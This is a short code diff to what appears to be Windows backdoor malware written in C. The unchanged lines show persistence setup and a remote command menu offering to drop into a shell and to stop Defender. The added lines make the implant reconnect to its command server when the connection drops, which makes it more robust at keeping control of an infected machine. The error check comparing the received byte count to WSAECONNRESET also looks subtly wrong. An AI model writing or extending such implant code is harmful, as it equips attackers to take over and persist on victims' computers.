@@ -301,6 +301,8 @@ int main(int argc, char* argv[]) {
 	attemptFullPersistenceNoNetwork(dirName);
 #endif
 
+	int bytesRecv;
+
 	char commandList[] =
 		"1. Drop into a shell\n"
 		"2. Attempt to stop defender\n"
@@ -319,7 +321,14 @@ int main(int argc, char* argv[]) {
 		memset(commandOpt, 0, sizeof commandOpt);
 
 		send(sockfd, commandList, sizeof commandList, 0);
-		recv(sockfd, commandOpt, sizeof commandOpt, 0);
+		bytesRecv = recv(sockfd, commandOpt, sizeof commandOpt, 0);
+
+		if (bytesRecv < 0 || bytesRecv == WSAECONNRESET) {
+			if ((sockfd = connectToServer()) == -1) {
+				ExitProcess(1);
+			}
+			continue;
+		}
 
 		cleanManagerInput(commandOpt, (size_t)sizeof commandOpt);
 
